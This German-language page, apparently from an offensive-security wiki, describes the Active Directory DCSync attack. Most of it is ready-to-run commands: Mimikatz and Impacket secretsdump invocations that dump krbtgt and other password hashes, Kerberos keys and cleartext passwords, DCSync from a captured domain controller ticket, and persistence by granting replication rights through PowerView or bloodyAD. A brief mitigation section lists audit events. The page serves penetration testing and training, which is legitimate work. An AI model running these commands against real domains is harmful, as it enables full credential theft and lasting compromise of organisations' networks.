# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Die **DCSync**-Berechtigung bedeutet, dass diese Berechtigungen für die Domain selbst vorhanden sind: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** und **Replicating Directory Changes In Filtered Set**.

**Wichtige Hinweise zu DCSync:**

- Der **DCSync-Angriff simuliert das Verhalten eines Domain Controller und fordert andere Domain Controller auf, Informationen zu replizieren** mithilfe des Directory Replication Service Remote Protocol (MS-DRSR). Da MS-DRSR eine gültige und notwendige Funktion von Active Directory ist, kann es nicht abgeschaltet oder deaktiviert werden.
- Standardmäßig haben nur die Gruppen **Domain Admins, Enterprise Admins, Administrators und Domain Controllers** die erforderlichen Privilegien.
- In der Praxis benötigt **vollständiges DCSync** **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** auf dem Domain Naming Context. `DS-Replication-Get-Changes-In-Filtered-Set` wird häufig zusammen mit ihnen delegiert, ist aber allein relevanter für das Synchronisieren von **confidential / RODC-gefilterten Attributen** (zum Beispiel alte LAPS-style secrets) als für einen vollständigen krbtgt-Dump.
- Wenn Kennwörter von Konten mit reversible encryption gespeichert sind, gibt es in Mimikatz eine Option, um das Kennwort im Klartext zurückzugeben

### Enumeration

Prüfe mit `powerview`, wer diese Berechtigungen hat:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Wenn du dich auf **non-default principals** mit DCSync-Rechten konzentrieren willst, filtere die integrierten replizierungsfähigen Gruppen heraus und prüfe nur unerwartete trustees:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Lokal ausnutzen
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Remote ausnutzen
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Praktische scoped Beispiele:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync using a captured DC machine TGT (ccache)

In Unconstrained-Delegation export-mode-Szenarien kannst du ein Domain Controller machine TGT erfassen (z. B. `DC1$@DOMAIN` für `krbtgt@DOMAIN`). Du kannst dann diesen ccache verwenden, um dich als der DC zu authentifizieren und DCSync ohne Passwort durchzuführen.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Betriebsnotizen:

- **Impackets Kerberos-Pfad berührt zuerst SMB**, bevor der DRSUAPI-Call erfolgt. Wenn die Umgebung **SPN target name validation** erzwingt, kann ein vollständiger Dump mit `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user` fehlschlagen.
- In diesem Fall entweder zuerst ein **`cifs/<dc>`**-Service-Ticket für den Ziel-DC anfordern oder für das Konto, das du sofort brauchst, auf **`-just-dc-user`** zurückfallen.
- Wenn du nur niedrigere Replikationsrechte hast, kann LDAP/DirSync-artiges Syncing trotzdem **confidential** oder **RODC-filtered** Attribute offenlegen (zum Beispiel das alte `ms-Mcs-AdmPwd`) ohne eine vollständige krbtgt-Replikation.

`-just-dc` erzeugt 3 Dateien:

- eine mit den **NTLM hashes**
- eine mit den **Kerberos keys**
- eine mit Klartext-Passwörtern aus der NTDS für alle Konten, bei denen [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Du kannst Benutzer mit reversibler Verschlüsselung mit folgendem Befehl ermitteln:

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Wenn du Domain Admin bist, kannst du diese Berechtigungen jedem Benutzer mit Hilfe von `powerview` gewähren:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux-Operatoren können dasselbe mit `bloodyAD` tun:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Dann können Sie **überprüfen, ob dem Benutzer** die 3 Privilegien korrekt zugewiesen wurden, indem Sie in der Ausgabe danach suchen (Sie sollten die Namen der Privilegien im Feld "ObjectType" sehen können):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – An operation was performed on an object
- Security Event ID 5136 (Audit Policy for object must be enabled) – A directory service object was modified
- Security Event ID 4670 (Audit Policy for object must be enabled) – Permissions on an object were changed
- AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
